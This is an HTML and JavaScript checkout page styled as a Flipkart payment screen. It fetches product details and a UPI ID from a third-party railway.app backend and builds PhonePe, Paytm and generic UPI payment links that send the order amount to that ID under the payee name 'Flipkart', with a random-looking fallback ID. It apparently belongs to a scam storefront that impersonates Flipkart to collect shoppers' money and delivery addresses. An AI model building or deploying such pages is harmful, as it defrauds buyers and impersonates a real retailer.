<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Payments</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    margin:0;
    background:#f1f3f6;
    overflow-x:hidden;
}

.header{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    background:#fff;
    z-index:1000;
    box-shadow:0 2px 4px rgba(0,0,0,0.12);
}

.header-top{
    padding:12px 16px;
    display:flex;
    align-items:center;
    gap:12px;
    border-bottom:1px solid #eee;
}

.back-arrow{
    width:10px;
    height:10px;
    border-left:2px solid #000;
    border-bottom:2px solid #000;
    transform:rotate(45deg);
    cursor:pointer;
}

.header img{
    width:100%;
    display:block;
}

.header-space{
    height:120px;
}

.card{
    background:#fff;
    border-radius:8px;
    margin:8px;
    padding:12px;
    box-shadow:0 1px 3px rgba(0,0,0,0.08);
}

.card h4{
    margin:0 0 10px 0;
    font-size:16px;
    color:#212121;
}

.address-title{
    font-size:14px;
    font-weight:bold;
    margin-bottom:6px;
}

.address-box{
    font-size:13px;
    color:#444;
    line-height:1.4;
}

.address-type{
    display:inline-block;
    margin-top:6px;
    padding:3px 6px;
    font-size:11px;
    background:#f0f5ff;
    color:#2874f0;
    border-radius:4px;
    font-weight:bold;
}

.pay-option{
    display:flex;
    align-items:center;
    gap:12px;
    padding:12px;
    border:2px solid #ddd;
    border-radius:8px;
    margin-bottom:10px;
    cursor:pointer;
    transition:0.3s;
}

.pay-option.selected{
    border-color:#2874f0;
    background:#f0f7ff;
}

.pay-option img{
    width:28px;
    height:28px;
    object-fit:contain;
}

.pay-option span{
    font-size:14px;
    font-weight:500;
}

.price-row{
    display:flex;
    justify-content:space-between;
    margin:8px 0;
    font-size:14px;
    color:#212121;
}

.price-row span:first-child{
    color:#878787;
}

.free{ 
    color:#388e3c !important;
    font-weight:600;
}

hr{
    border:none;
    border-top:1px dashed #e0e0e0;
    margin:12px 0;
}

.product-info{
    display:flex;
    align-items:center;
    gap:10px;
    margin-bottom:12px;
    padding-bottom:12px;
    border-bottom:1px solid #f0f0f0;
}

.product-image{
    width:60px;
    height:60px;
    object-fit:contain;
    border:1px solid #f0f0f0;
    border-radius:6px;
    padding:5px;
}

.product-details{
    flex:1;
}

.product-name{
    font-size:14px;
    color:#212121;
    margin-bottom:4px;
    line-height:1.3;
    display:-webkit-box;
    -webkit-line-clamp:2;
    -webkit-box-orient:vertical;
    overflow:hidden;
}

.product-price{
    font-size:16px;
    font-weight:bold;
    color:#212121;
}

.bottom-bar{
    position:fixed;
    bottom:0;
    left:0;
    width:100%;
    background:#fff;
    border-top:1px solid #eee;
    padding:12px 16px;
    display:flex;
    justify-content:space-between;
    align-items:center;
    box-shadow:0 -1px 3px rgba(0,0,0,0.1);
    z-index:100;
}

.amount{
    font-size:18px;
    font-weight:bold;
    color:#212121;
}

.btn{
    background:#fb641b;
    color:white;
    border:none;
    padding:12px 24px;
    font-size:16px;
    font-weight:bold;
    border-radius:4px;
    cursor:pointer;
    transition:background 0.3s;
}

.btn:hover{
    background:#e55a17;
}

.btn:disabled{
    background:#ccc;
    cursor:not-allowed;
}

.loading{
    text-align:center;
    padding:30px;
    color:#878787;
    font-size:14px;
}

.error-msg{
    color:#ff6161;
    text-align:center;
    padding:20px;
}

.error-msg button{
    background: #2874f0;
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 4px;
    cursor: pointer;
    margin-top: 10px;
}

.upi-id-info {
    background: #f8f9fa;
    border: 1px solid #dee2e6;
    border-radius: 6px;
    padding: 10px;
    margin-top: 10px;
    font-size: 13px;
}

.upi-id-info span {
    font-weight: bold;
    color: #2874f0;
}
</style>
</head>

<body>

<div class="header">
    <div class="header-top">
        <div class="back-arrow" onclick="goBack()"></div>
        <strong>Payments</strong>
    </div>
    <img src="assets/images/head.jpg" alt="Header Banner">
</div>

<div class="header-space"></div>

<div class="card" id="productCard">
    <div class="loading">Loading product details...</div>
</div>

<div class="card">
    <h4>Select Payment Method</h4>
    
    <div class="pay-option" data-method="phonepe">
        <img src="assets/images/phonepe-logo.webp" alt="PhonePe">
        <span>PhonePe</span>
    </div>

    <div class="pay-option" data-method="paytm">
        <img src="assets/images/paytm.png" alt="Paytm">
        <span>Paytm</span>
    </div>

    <div class="pay-option" data-method="qr">
        <img src="assets/images/qr.png" alt="QR Code">
        <span>SCAN TO PAY</span>
    </div>
    
    <div id="upiInfo" class="upi-id-info" style="display:none;">
        UPI ID: <span id="upiIdDisplay">Loading...</span>
    </div>
</div>

<div class="card">
    <h4>Price Details</h4>

    <div class="price-row" id="priceItem">
        <span>Price (1 item)</span>
        <span>₹--</span>
    </div>

    <div class="price-row">
        <span>Delivery Charges</span>
        <span class="free">FREE</span>
    </div>

    <hr>

    <div class="price-row" id="totalAmount">
        <strong>Amount Payable</strong>
        <strong>₹--</strong>
    </div>
</div>

<div class="card" id="addressCard">
    <div class="loading">Loading address...</div>
</div>

<div style="height:80px;"></div>

<div class="bottom-bar">
    <div class="amount" id="bottomAmount">₹--</div>
    <button class="btn" id="orderBtn" disabled>Order Now</button>
</div>

<script>
let productId = '';
let productName = '';
let productPrice = 0;
let selectedMethod = null;
let upiId = '';

function getProductIdFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('id');
}

function getProductIdFromStorage() {
    return localStorage.getItem("currentProductId");
}

// Fetch UPI ID from API - NAYA LOGIC ADD KIYA HAI BHAI
async function fetchUpiId() {
    try {
        const response = await fetch('https://flipback-production.up.railway.app/api/upi');
        if (!response.ok) throw new Error("Failed to fetch UPI");
        
        const upiData = await response.json();
        
        // Check for the specific UPI ID you mentioned
        if (upiData && upiData.upi_id) {
            upiId = upiData.upi_id;
        } else if (upiData.upi_1767821539402 && upiData.upi_1767821539402.upi_id) {
            // If data is in nested structure
            upiId = upiData.upi_1767821539402.upi_id;
        } else {
            // Fallback UPI ID
            upiId = 'sfsfwfwe@okicici';
        }
        
        // Display UPI ID
        document.getElementById('upiIdDisplay').textContent = upiId;
        document.getElementById('upiInfo').style.display = 'block';
        
        console.log('UPI ID fetched:', upiId);
        
    } catch (error) {
        console.error('Error fetching UPI:', error);
        // Fallback UPI ID
        upiId = 'sfsfwfwe@okicici';
        document.getElementById('upiIdDisplay').textContent = upiId + ' (offline)';
        document.getElementById('upiInfo').style.display = 'block';
    }
}

// Open UPI App - NAYA LOGIC ADD KIYA HAI BHAI
function openUpiApp() {
    if (!upiId || !productPrice) {
        alert('UPI details not available');
        return;
    }
    
    // Remove special characters and spaces from product name for UPI URL
    const sanitizedName = productName.replace(/[^a-zA-Z0-9]/g, ' ').substring(0, 30);
    
    // Construct UPI URL based on selected method
    let upiUrl = '';
    
    if (selectedMethod === 'phonepe') {
        // PhonePe UPI URL
        upiUrl = `phonepe://upi/pay?pa=${encodeURIComponent(upiId)}&pn=Flipkart&am=${productPrice}&cu=INR&tn=${encodeURIComponent(sanitizedName)}`;
    } else if (selectedMethod === 'paytm') {
        // Paytm UPI URL
        upiUrl = `paytmmp://upi/pay?pa=${encodeURIComponent(upiId)}&pn=Flipkart&am=${productPrice}&cu=INR&tn=${encodeURIComponent(sanitizedName)}`;
    } else {
        // Generic UPI URL (works with most UPI apps)
        upiUrl = `upi://pay?pa=${encodeURIComponent(upiId)}&pn=Flipkart&am=${productPrice}&cu=INR&tn=${encodeURIComponent(sanitizedName)}`;
    }
    
    console.log('Opening UPI URL:', upiUrl);
    
    // Try to open UPI app
    window.location.href = upiUrl;
    
    // Fallback: If UPI app not installed, show alert after a delay
    setTimeout(() => {
        if (document.hasFocus()) {
            alert(`${selectedMethod.charAt(0).toUpperCase() + selectedMethod.slice(1)} app not found. Please install it from Play Store/App Store.\n\nOr use UPI ID: ${upiId}\nAmount: ₹${productPrice}`);
        }
    }, 500);
}

async function loadProductDetails() {
    const productCard = document.getElementById("productCard");
    const priceItem = document.getElementById("priceItem");
    const totalAmount = document.getElementById("totalAmount");
    const bottomAmount = document.getElementById("bottomAmount");
    
    productId = getProductIdFromURL() || getProductIdFromStorage();
    
    if (!productId) {
        productCard.innerHTML = `
            <div class="error-msg">
                Product ID not found. Please go back and select a product.
            </div>
        `;
        return;
    }
    
    try {
        const response = await fetch('https://flipback-production.up.railway.app/api/products');
        if (!response.ok) throw new Error("Network response was not ok");
        
        const data = await response.json();
        const product = data[productId];
        
        if (!product) {
            productCard.innerHTML = `
                <div class="error-msg">
                    Product not found.
                </div>
            `;
            return;
        }
        
        productName = product.name || "Product";
        const originalPrice = product.price || 0;
        const discountAmount = product.discount_amount || 0;
        const discountPercent = product.discount_percent || 0;
        const discountedPrice = product.discounted_price || 0;
        const mainImage = product.main_image || 'https://via.placeholder.com/60x60?text=Product';
        
        let sellingPrice = discountedPrice;
        if (!sellingPrice && originalPrice && discountAmount) {
            sellingPrice = originalPrice - discountAmount;
        } else if (!sellingPrice && originalPrice && discountPercent) {
            sellingPrice = originalPrice * (1 - discountPercent/100);
        } else if (!sellingPrice) {
            sellingPrice = originalPrice;
        }
        
        productPrice = Math.round(sellingPrice);
        
        productCard.innerHTML = `
            <div class="product-info">
                <img src="${mainImage}" class="product-image" 
                     onerror="this.onerror=null; this.src='https://via.placeholder.com/60x60?text=Product'" 
                     alt="${productName}">
                <div class="product-details">
                    <div class="product-name">${productName}</div>
                    <div class="product-price">₹${productPrice.toLocaleString('en-IN')}</div>
                </div>
            </div>
        `;
        
        priceItem.innerHTML = `
            <span>Price (1 item)</span>
            <span>₹${productPrice.toLocaleString('en-IN')}</span>
        `;
        
        totalAmount.innerHTML = `
            <strong>Amount Payable</strong>
            <strong>₹${productPrice.toLocaleString('en-IN')}</strong>
        `;
        
        bottomAmount.textContent = `₹${productPrice.toLocaleString('en-IN')}`;
        
        document.getElementById("orderBtn").disabled = false;
        
    } catch {
        productCard.innerHTML = `
            <div class="error-msg">
                Failed to load product details. Please try again.
                <br><br>
                <button onclick="location.reload()">Retry</button>
            </div>
        `;
    }
}

function loadAddress() {
    const addressCard = document.getElementById("addressCard");
    const data = localStorage.getItem("userAddress");

    if(!data){
        addressCard.innerHTML = `
            <div class="address-title">Delivery Address</div>
            <div class="address-box" style="color:#ff6161;">
                No address found. Please go back and add an address.
            </div>
        `;
        document.getElementById("orderBtn").disabled = true;
    } else {
        const a = JSON.parse(data);
        addressCard.innerHTML = `
            <div class="address-title">Deliver to: ${a.name || 'User'}, ${a.pin || ''}</div>
            <div class="address-box">
                ${a.house || ''}, ${a.road || ''}<br>
                ${a.city || ''}, ${a.state || ''}<br>
                Phone: ${a.phone || ''}
            </div>
            <div class="address-type">${(a.type || 'home').toUpperCase()}</div>
        `;
    }
}

function navigateToPayPage() {
    if (!productId) {
        alert("Product ID not found");
        return;
    }
    
    let payPageUrl = 'pay.html';
    
    if (productId) {
        payPageUrl += `?id=${encodeURIComponent(productId)}`;
        
        if (productName) {
            payPageUrl += `&name=${encodeURIComponent(productName)}`;
        }
        if (productPrice) {
            payPageUrl += `&price=${encodeURIComponent(productPrice)}`;
        }
    }
    
    window.location.href = payPageUrl;
}

function goBack() {
    window.history.back();
}

document.addEventListener('DOMContentLoaded', function() {
    loadProductDetails();
    loadAddress();
    
    // Fetch UPI ID from API - NAYA CALL KIYA HAI BHAI
    fetchUpiId();
    
    const payOptions = document.querySelectorAll(".pay-option");
    
    payOptions.forEach(option => {
        option.addEventListener("click", () => {
            payOptions.forEach(p => p.classList.remove("selected"));
            option.classList.add("selected");
            selectedMethod = option.dataset.method;
            
            // UPI ID show/hide logic
            if (selectedMethod === 'qr') {
                document.getElementById('upiInfo').style.display = 'none';
            } else {
                document.getElementById('upiInfo').style.display = 'block';
            }
        });
    });
    
    document.getElementById("orderBtn").addEventListener("click", async () => {
        if (!selectedMethod) {
            alert("Please select a payment method");
            return;
        }
        
        if (selectedMethod === "qr") {
            navigateToPayPage();
        } else {
            // PhonePe or Paytm selected - Open UPI App
            openUpiApp();
        }
    });
    
    if (payOptions.length > 0) {
        payOptions[0].click();
    }
});
</script>

</body>
</html>
